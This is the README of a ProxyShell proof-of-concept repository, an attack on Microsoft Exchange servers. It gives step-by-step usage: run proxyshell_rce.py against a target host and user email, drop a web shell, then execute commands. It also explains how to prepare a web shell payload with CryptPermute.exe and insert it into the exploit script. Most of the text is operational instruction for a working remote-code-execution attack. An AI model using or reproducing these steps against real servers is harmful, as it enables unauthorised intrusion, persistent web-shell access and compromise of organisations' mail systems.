# proxyshell-poc

## base usage
1. `python3 proxyshell_rce.py -u ip|domain -e user@domain.com`
2. `dropshell`
3. `whoami`

## generate CryptPermute content
1. execute `CryptPermute.exe shell.txt`, generate file `poc`.
2. base64 `poc` file.
3. Replace the contents of line 314 of the `proxyshell_rce.py` file:
```
<t:Content>base64 `poc` file string</t:Content>
```

## Reference link
https://github.com/dmaasland/proxyshell-poc

https://blog.riskivy.com/exchange-proxyshell%E6%BC%8F%E6%B4%9E%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/

https://mp.weixin.qq.com/s/aEnoBvibp-gkt3qtcOXqAw
